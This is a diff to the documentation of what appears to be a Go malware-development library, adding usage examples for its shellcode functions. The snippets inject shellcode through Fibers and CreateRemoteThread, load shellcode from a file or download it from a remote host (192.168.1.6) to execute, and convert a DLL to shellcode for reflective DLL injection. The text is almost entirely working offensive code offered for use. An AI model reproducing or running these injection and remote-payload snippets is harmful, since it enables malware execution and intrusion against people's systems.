@@ -34,7 +34,12 @@ func main(){
     log.Fatal(err)
   }
 
-  err = shellcode.CreateRemoteThread(calc_shellcode)
+  err = shellcode.Fibers(calc_shellcode) // This technique doesn't exit until process ends
+  if err != nil {
+    log.Fatal(err)
+  }
+
+  err = shellcode.CreateRemoteThread(calc_shellcode) // This technique doesn't exit until process ends
   if err != nil {
     log.Fatal(err)
   }
@@ -53,7 +58,7 @@ import (
 )
 
 func main(){
-  shellcode_to_exec, err := shellcode.GetShellcodeFromFile("./shellcode.bin")
+  shellcode_to_exec, err := shellcode.GetShellcodeFromFile("./shellcode.bin") // func GetShellcodeFromFile(filename string) []byte {}
   if err != nil {
     log.Fatal(err)
   }
@@ -73,7 +78,7 @@ import (
 )
 
 func main(){
-  shellcode_to_exec, err := shellcode.GetShellcodeFromUrl("http://192.168.1.6/shellcode.bin")
+  shellcode_to_exec, err := shellcode.GetShellcodeFromUrl("http://192.168.1.6/shellcode.bin") // func GetShellcodeFromUrl(url string) []byte {}
   if err != nil {
     log.Fatal(err)
   }
@@ -81,7 +86,26 @@ func main(){
 }
 ```
 
+## Convert DLL to shellcode
 
+- This function is really useful to perform a ***sRDI*** **(shellcode Reflective DLL Injection)**. It autodetects between x86 and x64 architecture
+
+```go
+package main
+
+import (
+  "log"
+
+  "github.com/D3Ext/maldev/shellcode"
+)
+
+func main(){
+  err := shellcode.ConvertDllToShellcode("example.dll", "functionName", "") // func ConvertDllToShellcode(dll_file string, function_name string, args string) ([]byte, error) {}
+  if err != nil {
+    log.Fatal(err)
+  }
+}
+```
 
 
 
